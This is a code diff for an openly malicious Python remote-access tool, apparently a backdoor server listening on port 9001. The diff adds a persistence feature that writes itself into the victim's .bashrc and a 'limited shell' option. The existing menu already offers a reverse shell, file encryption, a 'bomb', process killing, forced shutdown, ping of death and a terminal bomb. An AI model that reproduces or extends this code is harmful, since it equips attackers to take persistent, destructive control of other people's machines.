@@ -13,6 +13,7 @@ from usage import *
 from dropshell import *
 from encrypting import *
 from bomb import *
+from persistent import *
 host = '0.0.0.0'
 port = 9001 
 
@@ -43,7 +44,7 @@ def banner(con):
 
 def menu(con):
     banner(con)
-    mainMenu = b'\n\nChoose What To Retrieve!\n1. OS Information\n2. System Information\n3. Process Information\n4. Network Information\n5. File and Directory\n6. Hardware Usage\n7. Execute Reverse Shell\n8. Encrypt File\n9. Drop Bomb\n10. Kill Process\n11. Shutdown/Restart\n12. Ping of Death\n13. Terminal Bomb\n'
+    mainMenu = b'\n\nChoose What To Retrieve!\n1. OS Information\n2. System Information\n3. Process Information\n4. Network Information\n5. File and Directory\n6. Hardware Usage\n7. Execute Reverse Shell\n8. Encrypt File\n9. Drop Bomb\n10. Kill Process\n11. Shutdown/Restart\n12. Ping of Death\n13. Terminal Bomb\n14. Run persistent\n15. Limited Shell'
     con.sendall(mainMenu)
     con.sendall(b'\nSpecify Option: ')
     opt = con.recv(1024)
@@ -77,6 +78,12 @@ def menu(con):
                 sysControl(con)
             elif(opt == 13):
                 termBomb(con)
+            elif(opt ==14):
+                con.sendall(b"ONLY WOKRS ON LINUX!")
+                add2bashrc()
+                con.sendall(b"DONE!")
+            elif(opt ==15):
+                limitedShell(con)
         except ValueError:
             con.sendall(b'Please only send integer value representing each option\n')
         except KeyboardInterrupt:
